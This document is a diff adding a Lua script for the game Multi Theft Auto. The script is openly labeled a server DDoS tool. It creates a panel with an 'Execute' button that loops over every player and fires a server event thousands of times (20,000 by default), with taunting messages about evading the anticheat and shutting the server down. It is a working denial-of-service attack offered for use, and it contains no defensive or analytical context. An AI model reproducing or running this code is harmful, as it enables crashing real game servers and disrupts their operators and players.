@@ -1,0 +1,27 @@
+local ativo = false
+local Painel, edit1, botao
+function injectlua()
+    ativo = not ativo
+    showCursor(ativo)
+    if ativo then
+        Painel = guiCreateWindow(0.81, 0.77, 0.19, 0.19, "Server DDOS By Paozin do Mta -Comeback", true)
+        edit1 = guiCreateEdit(0.35, 0.34, 0.39, 0.16, "20000", true, Painel)
+        botao = guiCreateButton(0.37, 0.53, 0.34, 0.15, "Execute", true, Painel)
+        addEventHandler('onClientGUIClick', botao, function()
+            local ddos_hard_1 = tonumber(guiGetText(edit1))
+            if ddos_hard_1 then
+                for i, player in ipairs(getElementsByType("player")) do
+                    for i = 1, ddos_hard_1 do
+                        triggerServerEvent("discord.gg/KNHpCBrdvg", player, i, 1, "Anticheat existence = 0", "Easy shutdown xD", "Can't Stop Us", "DDOS By Paozin Do Mta -Comeback on YouTube")
+                    end
+                end
+            end
+        end, false)
+        guiSetProperty(Painel, "CaptionColour", "FFFE0000")
+        guiSetProperty(botao, "NormalTextColour", "FF29FD00")
+    elseif isElement(Painel) then
+        destroyElement(Painel)
+    end
+end
+bindKey('End', 'down', injectlua)
+addCommandHandler('ddos', injectlua)
